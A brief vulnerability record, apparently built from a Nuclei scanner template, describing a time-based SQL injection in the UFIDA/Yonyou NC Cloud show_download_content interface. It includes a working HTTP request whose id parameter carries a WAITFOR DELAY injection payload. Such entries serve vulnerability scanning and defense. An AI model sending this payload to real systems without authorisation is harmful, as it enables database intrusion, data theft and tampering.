# Vulnerability: UFIDA NC Cloud - SQL Injection
**Classification:** TIME-BASED-SQLI
**Source:** Nuclei Template (`yonyou-ufida-nc-cloud-sqli.yaml`)

## Description
The NC-Cloud system's show_download_content interface has a SQL injection vulnerability, which allows attackers to manipulate the database through maliciously constructed SQL statements, resulting in data leaks, tampering or destruction, and seriously threatening system security.

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout 30s
GET /ebvp/infopub/show_download_content;.js?id=1';WAITFOR+DELAY+'0:0:6'-- HTTP/1.1
Host: {{Hostname}}
```

